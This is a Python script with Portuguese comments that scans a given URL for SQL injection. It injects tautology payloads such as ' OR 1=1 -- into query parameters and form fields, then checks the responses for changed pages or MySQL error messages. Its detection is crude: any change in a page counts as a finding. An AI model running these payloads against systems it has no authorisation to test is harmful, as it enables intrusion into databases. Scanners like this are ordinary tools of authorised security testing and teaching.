import copy
from urllib import parse
import requests
from bs4 import BeautifulSoup
import sys


# Função para fazer requisição com cabeçalhos, incluindo cookies
def make_request(session, url, data=None):
    try:
        if data:
            response = session.post(url, data=data)
        else:
            response = session.get(url)
        response.raise_for_status()  # Levanta um erro para códigos de status 4xx/5xx
        return response.text
    except requests.exceptions.RequestException as e:
        print(f"Erro ao fazer a requisição: {e}")
        return None


# Função para verificar se a página está vulnerável a SQL Injection
def is_vulnerable(original_html, injected_html):
    # Compare as respostas: se mudarem, isso pode ser um indicativo de vulnerabilidade
    if not original_html or not injected_html:
        return False

    # Se o conteúdo da página mudou drasticamente após a injeção, pode ser um sinal de vulnerabilidade
    if original_html != injected_html:
        print("O comportamento da página mudou, indicando possível vulnerabilidade!")
        return True

    # Procura por erros típicos de SQL Injection no HTML
    error_messages = [
        "You have an error in your SQL syntax",
        "Warning: mysql_fetch_array()",
        "SQL syntax error",
        "mysql_error()"
    ]

    for error in error_messages:
        if error in injected_html:
            return True

    return False


# Função para escanear a URL e obter parâmetros de query
def scan_url_for_params(url):
    url_parsed = parse.urlsplit(url)  # Separa a URL em partes
    params = parse.parse_qs(url_parsed.query)  # Extrai os parâmetros de consulta (query params)
    return url_parsed, params


# Função para procurar parâmetros nos formulários da página HTML
def extract_form_params(html, base_url):
    soup = BeautifulSoup(html, 'html.parser')
    form_params = []

    # Procurando por formulários na página
    for form in soup.find_all('form'):
        action = form.get('action', '')
        if not action.startswith('http'):
            action = parse.urljoin(base_url, action)

        # Buscando os parâmetros dos formulários
        for input_tag in form.find_all('input'):
            name = input_tag.get('name')
            if name:
                form_params.append((action, name))

    return form_params


# Função principal que escaneia os parâmetros da URL e formulários
def scan_for_sql_injection(url):
    # Criar uma sessão para lidar automaticamente com cookies
    session = requests.Session()

    # Fazer a requisição inicial para pegar os parâmetros e cookies
    html = make_request(session, url)
    if html is None:
        print("Erro ao obter o conteúdo da página(site).")
        return

    print("Página carregada, iniciando o Scan...")

    # Obter os parâmetros da URL automaticamente
    url_parsed, params = scan_url_for_params(url)

    # Testar parâmetros de query
    for param in params.keys():
        modified_params = copy.deepcopy(params)

        # Tentar diferentes payloads de SQL Injection
        payloads = ["' OR 1=1 --", '" OR 1=1 --', "' OR 'a' = 'a'", '" OR "a"="a"']
        for payload in payloads:
            modified_params[param] = [payload]  # Alterar o valor do parâmetro para caracteres especiais

            # Codificar os parâmetros novamente
            new_query = parse.urlencode(modified_params, doseq=True)
            url_final = url_parsed._replace(query=new_query)
            url_final = url_final.geturl()

            # Fazer a requisição com cookies da sessão e verificar a vulnerabilidade
            injected_html = make_request(session, url_final)
            if is_vulnerable(html, injected_html):
                print(f"Vulnerabilidade na URL: {url_final}")
                return

    # Buscar parâmetros nos formulários da página
    form_params = extract_form_params(html, url)
    for action, param in form_params:
        print(f"Testando formulário em {action} com o parâmetro {param}")

        # Tentar diferentes payloads de SQL Injection
        payloads = ["' OR 1=1 --", '" OR 1=1 --', "' OR 'a' = 'a'", '" OR "a"="a"']
        for payload in payloads:
            modified_data = {param: payload}

            # Fazer a requisição do formulário com os dados modificados e os cookies da sessão
            injected_html = make_request(session, action, data=modified_data)
            if is_vulnerable(html, injected_html):
                print(f"Vulnerável: {action} com o parâmetro {param}")
                return

    print("Não é Vulnerável")


# Executar o código se o script for executado diretamente
if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Use: python3 sql_injection_scanner.py <url>")
        sys.exit(1)

    url = sys.argv[1]

    scan_for_sql_injection(url)
